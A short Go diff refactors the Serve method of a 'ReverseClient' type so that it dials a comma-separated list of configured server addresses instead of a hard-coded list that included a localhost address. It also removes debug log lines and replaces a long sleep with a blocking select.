@@ -6,7 +6,7 @@ import (
 	"fmt"
 	"log"
 	"net"
-	"time"
+	"strings"
 )
 
 // ReverseClient is the local shell server.
@@ -43,20 +43,15 @@ func (s *ReverseClient) Dialer() func(context.Context, string) (net.Conn, error)
 
 // Serve starts the server.
 func (s *ReverseClient) Serve() error {
+	// 调用 multi_server_conn 注册到多个 grpc server
 	mgr := NewConnectionManager(s)
-	servers := []string{
-		s.address,
-		"https://127.0.0.1:42222",
-	}
-	for _, addr := range servers {
-		log.Println("11111111")
+	for _, addr := range strings.Split(s.address, ",") {
 		if err := mgr.Call(context.Background(), addr, doThing); err != nil {
 			log.Println("call error:", err)
+			return nil
 		}
-		log.Println("2222333")
 	}
-	time.Sleep(10000 * time.Second)
-	return nil
+	select {}
 
 	// Dial the server.
 	//creds := credentials.NewTLS(s.tlsconfig)
